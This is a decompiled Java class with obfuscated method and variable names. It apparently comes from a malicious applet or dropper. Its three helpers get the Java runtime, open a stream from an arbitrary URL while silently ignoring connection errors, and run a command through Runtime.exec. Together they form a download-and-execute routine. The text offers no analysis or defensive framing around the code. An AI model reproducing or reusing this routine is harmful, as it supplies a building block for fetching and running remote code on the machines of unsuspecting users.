import java.net.URL;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class Ewsf
{
    public static Runtime derTT() {
        return Runtime.getRuntime();
    }
    
    public static InputStream Deadss(final String sdhds) throws Exception {
        final URL url = new URL(sdhds);
        try {
            url.openConnection();
        }
        catch (Exception ex) {}
        return url.openStream();
    }
    
    public static void mese(final String fn) throws Exception {
        final Process dexa = derTT().exec(fn);
        dexa.waitFor();
    }
}
